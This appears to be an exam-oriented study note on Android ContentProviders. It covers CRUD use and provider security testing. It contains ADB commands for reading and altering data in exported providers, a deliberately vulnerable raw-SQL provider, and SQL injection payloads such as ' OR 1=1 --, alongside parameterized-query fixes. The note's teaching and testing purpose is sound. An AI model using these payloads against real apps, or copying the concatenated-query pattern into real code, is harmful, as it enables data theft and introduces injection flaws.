## ContentProvider in Android (Detailed Note)

A **ContentProvider** is one of the four main Android components that **manages and shares app data securely between applications**. It provides a standard interface to **store, retrieve, update, and delete data**.

ContentProviders are commonly used to **share structured data** between apps while enforcing security permissions.

Example data sources:

* SQLite databases
* Files
* Network data
* Shared preferences

---

# Purpose of ContentProvider

* Share data between applications
* Control access to app data
* Provide a **standard interface for data operations**
* Enforce **permissions and security policies**

Example:
Contacts app provides a ContentProvider so other apps can access **contact information**.

---

# How ContentProvider Works

Apps interact with ContentProviders using **Content Resolver** and **URIs (Uniform Resource Identifiers)**.

Example URI format:

```
content://authority/path/id
```

Example:

```
content://contacts/people/1
```

Components:

* **content://** → URI scheme
* **authority** → provider name
* **path** → table or data type
* **id** → specific record

---

# Core Methods of ContentProvider

| Method       | Purpose                  |
| ------------ | ------------------------ |
| `onCreate()` | Initializes the provider |
| `query()`    | Retrieve data            |
| `insert()`   | Insert new data          |
| `update()`   | Update existing data     |
| `delete()`   | Remove data              |
| `getType()`  | Returns MIME type        |

---

# Example ContentProvider Code

```java
public class MyProvider extends ContentProvider {

    public boolean onCreate() {
        return true;
    }

    public Cursor query(Uri uri, String[] projection,
                        String selection, String[] selectionArgs,
                        String sortOrder) {
        return database.query(...);
    }

    public Uri insert(Uri uri, ContentValues values) {
        return database.insert(...);
    }

    public int delete(Uri uri, String selection, String[] args) {
        return database.delete(...);
    }

    public int update(Uri uri, ContentValues values,
                      String selection, String[] args) {
        return database.update(...);
    }
}
```

---

# Declaring ContentProvider in AndroidManifest.xml

```xml
<provider
    android:name=".MyProvider"
    android:authorities="com.example.provider"
    android:exported="true"/>
```

---

# Data Operations in ContentProvider

| Operation   | Method     | Example          |
| ----------- | ---------- | ---------------- |
| Read data   | `query()`  | Retrieve records |
| Insert data | `insert()` | Add new row      |
| Update data | `update()` | Modify data      |
| Delete data | `delete()` | Remove record    |

These operations are similar to **CRUD (Create, Read, Update, Delete)** operations.

---

# Accessing ContentProvider

Applications use **ContentResolver** to access providers.

Example:

```java
Cursor cursor = getContentResolver().query(
    ContactsContract.Contacts.CONTENT_URI,
    null, null, null, null);
```

---

# Types of ContentProviders

| Type                        | Description                      |
| --------------------------- | -------------------------------- |
| **System ContentProviders** | Built-in providers like Contacts |
| **Custom ContentProviders** | Created by developers            |
| **File Providers**          | Used for secure file sharing     |

---

# Security Issues (Important for Android Security Testing)

Misconfigured ContentProviders can lead to **data leakage vulnerabilities**.

Common problems:

| Vulnerability            | Description             |
| ------------------------ | ----------------------- |
| Exported provider        | Any app can access data |
| No permission protection | Sensitive data exposed  |
| SQL injection            | Poor query validation   |

Example command used in testing:

```
adb shell content query --uri content://example.provider/table
```

---

# Advantages of ContentProvider

* Secure data sharing
* Structured data management
* Standard interface for applications
* Permission-based access control

---

# ContentProvider vs Other Components

| Component         | Purpose               |
| ----------------- | --------------------- |
| Activity          | User interface        |
| Service           | Background processing |
| BroadcastReceiver | Event handling        |
| ContentProvider   | Data sharing          |

---

**One-line Exam Definition**

> ContentProvider is an Android component that manages and shares structured data between applications using a standardized interface and URI-based access.


---

# ContentProvider Exploitation in Android Security Testing (Using ADB)

In Android security testing, **ContentProviders are often checked for misconfigurations** that may allow unauthorized apps to access or modify sensitive data.

If a ContentProvider is **exported and not protected with permissions**, attackers can interact with it using **ADB commands**.

---

# Step 1: Identify Content Providers

First, check whether an app contains a ContentProvider.

```bash
adb shell dumpsys package com.example.app | grep provider
```

Or inspect the manifest:

```bash
apktool d app.apk
```

Look for:

```xml
<provider
    android:name=".MyProvider"
    android:authorities="com.example.provider"
    android:exported="true"/>
```

If `exported=true`, other apps may access it.

---

# Step 2: Query Data from ContentProvider

Use the **content command** to retrieve data.

```bash
adb shell content query --uri content://com.example.provider/table
```

Example:

```bash
adb shell content query --uri content://contacts/people
```

This returns records stored in the provider.

---

# Step 3: Insert Data

If the provider allows writing, attackers can insert data.

```bash
adb shell content insert \
--uri content://com.example.provider/table \
--bind name:s:Ayush \
--bind age:i:21
```

---

# Step 4: Update Data

Modify existing records.

```bash
adb shell content update \
--uri content://com.example.provider/table \
--bind name:s:Hacker \
--where "id=1"
```

---

# Step 5: Delete Data

Remove records from database.

```bash
adb shell content delete \
--uri content://com.example.provider/table \
--where "id=1"
```

---

# Step 6: List All Available Content Providers

```bash
adb shell pm list packages -f
```

or

```bash
adb shell dumpsys package | grep provider
```

---

# Example Attack Scenario

Suppose an app stores **user credentials** in a ContentProvider.

If it is exported without permission protection:

```
content://com.vulnerable.app/users
```

An attacker can run:

```bash
adb shell content query --uri content://com.vulnerable.app/users
```

Result:

```
Row: 0 username=admin password=123456
Row: 1 username=user password=password
```

This leads to **data leakage vulnerability**.

---

# Common ContentProvider Vulnerabilities

| Vulnerability      | Description               |
| ------------------ | ------------------------- |
| Exported provider  | Allows external access    |
| Missing permission | Sensitive data accessible |
| SQL injection      | Improper input validation |
| Path traversal     | Accessing unintended data |

---

# Security Best Practices

Developers should:

* Set `android:exported="false"` if external access is not needed
* Protect provider using permissions
* Validate query inputs
* Use parameterized queries

Example secure provider:

```xml
<provider
    android:name=".MyProvider"
    android:authorities="com.example.provider"
    android:exported="false"/>
```

---

# ContentProvider Pentesting Workflow

1️⃣ Extract APK

```
adb pull /data/app/app.apk
```

2️⃣ Analyze manifest

```
apktool d app.apk
```

3️⃣ Identify providers

4️⃣ Test access with `adb shell content query`

---

**One-Line Exam Answer**

> ContentProvider vulnerabilities occur when providers are improperly exported or lack permission protection, allowing attackers to access or manipulate application data using ADB commands.

---

## Using ContentProvider in an Android App with Java Functions

In Android applications, a **ContentProvider is accessed using the `ContentResolver` class**. Java functions are used to perform **CRUD operations (Create, Read, Update, Delete)** on the data stored in the ContentProvider.

---

# 1. Query Data (Read Operation)

To retrieve data from a ContentProvider, the **`query()`** function is used.

### Java Example

```java
Uri uri = Uri.parse("content://com.example.provider/users");

Cursor cursor = getContentResolver().query(
        uri,
        null,
        null,
        null,
        null
);

while(cursor.moveToNext()){
    String name = cursor.getString(cursor.getColumnIndex("name"));
    System.out.println(name);
}
```

### Purpose

* Reads data from the provider
* Returns results in a **Cursor object**

---

# 2. Insert Data (Create Operation)

The **`insert()`** function adds new records to the provider.

### Java Example

```java
Uri uri = Uri.parse("content://com.example.provider/users");

ContentValues values = new ContentValues();
values.put("name", "Ayush");
values.put("age", 20);

getContentResolver().insert(uri, values);
```

### Purpose

* Adds new data into database or storage managed by the provider.

---

# 3. Update Data

The **`update()`** function modifies existing records.

### Java Example

```java
ContentValues values = new ContentValues();
values.put("name", "UpdatedUser");

getContentResolver().update(
        uri,
        values,
        "id=?",
        new String[]{"1"}
);
```

### Purpose

* Updates specific rows using conditions.

---

# 4. Delete Data

The **`delete()`** function removes records.

### Java Example

```java
getContentResolver().delete(
        uri,
        "id=?",
        new String[]{"1"}
);
```

### Purpose

* Deletes records based on selection conditions.

---

# CRUD Operations Summary

| Operation | Java Function | Purpose        |
| --------- | ------------- | -------------- |
| Create    | `insert()`    | Add new record |
| Read      | `query()`     | Retrieve data  |
| Update    | `update()`    | Modify data    |
| Delete    | `delete()`    | Remove record  |

---

# Example URI Structure

```
content://authority/table/id
```

Example:

```
content://com.example.provider/users/1
```

Parts:

* **content://** → scheme
* **authority** → provider name
* **table** → data path
* **id** → specific record

---

# Security Consideration

If an app exposes its ContentProvider with:

```
android:exported="true"
```

Other apps may access its data using these functions or via **ADB commands**, which may lead to **data leakage**.

---

**One-line Exam Definition**

> ContentProvider operations in Android are performed using Java functions like `query()`, `insert()`, `update()`, and `delete()` through the `ContentResolver` interface.



---
# SQL Injection in Android ContentProvider (Detailed Note)

**SQL Injection in a ContentProvider** occurs when an application does not properly validate user input used in database queries inside the provider. If the query is constructed using **raw strings instead of parameterized queries**, an attacker can manipulate the SQL statement and access unauthorized data.

---

# How SQL Injection Happens in ContentProvider

A ContentProvider usually interacts with a **SQLite database**. If the developer builds the query like this:

```java
Cursor cursor = db.query(
        "users",
        null,
        "username='" + username + "'",
        null,
        null,
        null,
        null
);
```

If `username` is not sanitized, an attacker could input:

```
' OR 1=1 --
```

The SQL query becomes:

```
SELECT * FROM users WHERE username='' OR 1=1 --
```

This returns **all records in the table**, bypassing authentication or restrictions.

---

# Example Vulnerable ContentProvider Code

```java
public Cursor query(Uri uri, String[] projection,
                    String selection, String[] selectionArgs,
                    String sortOrder) {

    SQLiteDatabase db = dbHelper.getReadableDatabase();

    return db.rawQuery(
            "SELECT * FROM users WHERE username = '" + selection + "'",
            null
    );
}
```

Problem:

* Uses **raw SQL concatenation**
* No input validation
* Vulnerable to injection

---

# Example SQL Injection Attack

If the provider exposes a URI like:

```
content://com.vulnerable.app/users
```

Attacker input:

```
' OR '1'='1
```

This forces the query to return all rows.

---

# Exploiting via ADB

In security testing, attackers may use the **content command**.

Example:

```bash
adb shell content query \
--uri content://com.vulnerable.app/users \
--where "username=' OR 1=1 --"
```

Result:

```
Row: 0 username=admin password=admin123
Row: 1 username=user password=test
```

Sensitive data becomes exposed.

---

# Signs of Vulnerable ContentProvider

| Indicator                 | Risk                              |
| ------------------------- | --------------------------------- |
| `android:exported="true"` | External apps can access provider |
| Raw SQL queries           | Injection risk                    |
| No permission checks      | Unauthorized data access          |
| No input validation       | Data manipulation                 |

---

# Secure Implementation (Prevention)

Developers should use **parameterized queries**.

Secure example:

```java
Cursor cursor = db.query(
        "users",
        null,
        "username=?",
        new String[]{username},
        null,
        null,
        null
);
```

This prevents SQL injection.

---

# Additional Security Measures

* Use **selectionArgs instead of concatenation**
* Restrict access with permissions
* Set `android:exported="false"` if sharing is not required
* Validate all input parameters

---

# Real Vulnerability Impact

If exploited, SQL injection in a ContentProvider can lead to:

| Impact                | Description              |
| --------------------- | ------------------------ |
| Data leakage          | Access confidential data |
| Authentication bypass | Login bypass             |
| Data modification     | Change database records  |
| Data deletion         | Remove important data    |

---

# Short Exam Definition

**SQL Injection in a ContentProvider occurs when user input is directly included in SQL queries without proper validation, allowing attackers to manipulate the query and access unauthorized data.**

